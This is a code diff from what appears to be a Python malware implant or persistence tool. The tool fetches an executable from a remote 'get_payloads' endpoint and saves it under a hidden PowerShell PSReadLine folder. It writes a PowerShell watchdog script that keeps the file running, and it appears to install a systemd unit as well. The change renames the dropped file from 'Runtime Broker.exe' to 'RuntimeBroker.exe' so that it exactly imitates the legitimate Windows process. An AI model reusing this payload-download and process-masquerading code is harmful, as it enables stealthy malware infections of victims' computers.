@@ -99,7 +99,7 @@ WantedBy=default.target"""
         with open(directory, "w") as f:
             f.write(
                 """# Define the process name you want to check
-$processName = "Runtime Broker.exe"
+$processName = "RuntimeBroker.exe"
     
 # Define the path to the executable you want to run
 $exePath = '"""+ path+ """'
@@ -147,7 +147,7 @@ try {
     if os_type == "Windows":
         import winreg
 
-        file_path = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\Runtime Broker.exe"
+        file_path = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\RuntimeBroker.exe"
         if not os.path.exists(file_path):
             response = requests.get(f"{url}get_payloads/{download_path}.exe")
             with open(file_path, "wb") as file:
